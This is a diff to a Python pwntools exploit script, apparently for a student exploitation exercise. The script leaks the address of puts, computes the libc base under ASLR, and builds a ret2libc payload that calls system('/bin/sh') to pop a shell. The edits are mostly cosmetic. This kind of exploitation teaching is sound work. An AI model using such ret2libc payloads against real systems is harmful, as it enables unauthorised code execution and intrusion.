@@ -42,8 +42,9 @@ if DEBUG:
     raw_input(f"attach with gdb, then press enter:\ngdb -p {p.pid}")
 
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
-print(r, '\n')
+print(r, "\n")
 
+print("> sending first payload")
 p.sendline(payload1)
 
 leak = p.recvn(7)  # receive address of __GI__IO_puts plus line-feed.
@@ -54,7 +55,7 @@ leak = leak[1:]  # slice off line-feed (0xa).
 # x/i 0x7ffff7e4be10
 # 0x7ffff7e4be10 <__GI__IO_puts>:      push   r14
 
-print("puts leak:", binascii.b2a_hex(leak), end='')
+print("puts leak:", binascii.b2a_hex(leak), end="")
 print(" (check with gdb> x/i 0x... or gdb gef> got)")
 
 
@@ -63,21 +64,23 @@ print(" (check with gdb> x/i 0x... or gdb gef> got)")
 # gdb gef> info proc map
 # 0x7ffff7dd6000     0x7ffff7dfc000    0x26000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.33.so
 
-libc_start_noaslr = 0x7FFFF7DD6000
-leak = int.from_bytes(leak, byteorder="big", signed=False)
-offset = leak - libc_start_noaslr
-
 # noaslr:
 # leak:  b'7ffff7e4be10'
 # offset to libc: 482832 0x75e10
 
-# with aslr:
-# leak - 0x75e10 -> libc start
+libc_start_noaslr = 0x7FFFF7DD6000
+offset_to_libc = 0x75E10
 
 #######
 
+# with aslr:
+# leak - 0x75e10 -> libc start
+
+leak = int.from_bytes(leak, byteorder="big", signed=False)
+offset = leak - libc_start_noaslr
+
 print("calculated offset:", hex(offset))
-libc_start = leak - 0x75E10
+libc_start = leak - offset_to_libc
 
 print("libc start:", hex(libc_start), end="")
 print(" (compare with gdb> info proc map)")
@@ -95,17 +98,17 @@ print(" (compare with gdb> info proc map)")
 
 bin_sh_offset = 0x198882
 system_offset = 0x49860
-exit_offset = 0x3f100
+exit_offset = 0x3F100
 
 #######
 
-print('\ncalculated addresses:')
-print('/bin/sh:', hex(bin_sh_offset + libc_start), '(gdb> x/s 0x...)')
-print('system():', hex(system_offset + libc_start), '(gdb> x/i 0x...)')
-print('exit():', hex(exit_offset + libc_start), '(gdb> x/i 0x...)')
+print("\ncalculated addresses:")
+print("/bin/sh:", hex(bin_sh_offset + libc_start), "(gdb> x/s 0x...)")
+print("system():", hex(system_offset + libc_start), "(gdb> x/i 0x...)")
+print("exit():", hex(exit_offset + libc_start), "(gdb> x/i 0x...)")
 
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
-print('\n', r)
+print("\n", r, "\n", sep="")
 
 # this payload uses the calculated offset to pop a shell:
 payload2 = (
@@ -117,6 +120,7 @@ payload2 = (
     + exit_call  # aslr.
 )
 
+print("> sending second payload")
 p.sendline(payload2)
 
 if DEBUG:
